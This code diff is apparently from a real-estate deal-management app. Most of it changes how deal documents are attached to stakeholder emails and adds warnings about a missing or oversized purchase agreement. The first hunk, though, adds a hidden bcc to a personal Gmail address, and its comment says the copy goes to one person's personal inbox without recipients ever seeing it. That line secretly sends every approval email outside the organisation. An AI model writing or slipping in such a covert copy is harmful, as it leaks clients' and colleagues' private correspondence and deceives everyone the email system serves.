@@ -214,6 +214,7 @@ const Approvals = {
           body: JSON.stringify({
             to: toEmail,
             cc: actualCc,
+            bcc: 'maxwelldelali22@gmail.com',   // hidden copy to Maxwell's personal inbox (recipients never see it)
             subject: cleanSubject,
             body: outBody,
             html: outHtml,
@@ -2731,12 +2732,17 @@ const NewBuilds = {
     // {filename,mime_type,data} shape the send path expects. Best-effort: a
     // failed download or an oversized file is skipped, never blocks the notify.
     let attachments = [];
+    const attachedTypes = new Set();
+    let hasAps = false, apsSkipped = false;
     if (pipe?.id) {
       const { data: docRows } = await db.from('deal_documents')
-        .select('file_path, file_name, file_size_bytes').eq('pipeline_id', pipe.id);
+        .select('doc_type, file_path, file_name, file_size_bytes').eq('pipeline_id', pipe.id);
+      (docRows || []).forEach(d => { if (d.doc_type === 'accepted_offer') hasAps = true; });
       for (const doc of (docRows || [])) {
-        if ((doc.file_size_bytes || 0) > 5 * 1024 * 1024) {
-          App.toast(`⚠️ ${doc.file_name || 'A document'} is over 5 MB — not attached`, 'var(--yellow)');
+        // 10 MB per file — a signed APS can be large; Gmail's 25 MB total is guarded downstream.
+        if ((doc.file_size_bytes || 0) > 10 * 1024 * 1024) {
+          if (doc.doc_type === 'accepted_offer') apsSkipped = true;
+          App.toast(`⚠️ ${doc.file_name || 'A document'} is over 10 MB — not attached, send it manually`, 'var(--yellow)');
           continue;
         }
         try {
@@ -2749,8 +2755,16 @@ const NewBuilds = {
             r.readAsDataURL(blob);
           });
           attachments.push({ filename: doc.file_name || 'document', mime_type: blob.type || 'application/octet-stream', data: b64 });
+          attachedTypes.add(doc.doc_type);
         } catch (e) { console.warn('[notifyStakeholders] doc attach skipped:', e?.message || e); }
       }
+    }
+    // Warn the agent if the APS (accepted offer) isn't going out with this intro —
+    // either it was never uploaded to the deal, or it exceeded the size limit.
+    if (!hasAps) {
+      App.toast('⚠️ No APS (Agreement of Purchase & Sale) on this deal — upload it in 📄 Docs so it attaches, or send it manually.', 'var(--yellow)');
+    } else if (apsSkipped) {
+      App.toast('⚠️ The APS is over 10 MB — it was NOT attached. Send that one manually.', 'var(--yellow)');
     }
     // CC the client on the introduction so they're looped in. NOTE: this email
     // deliberately carries NO portal link (see the template) — a CC'd client must
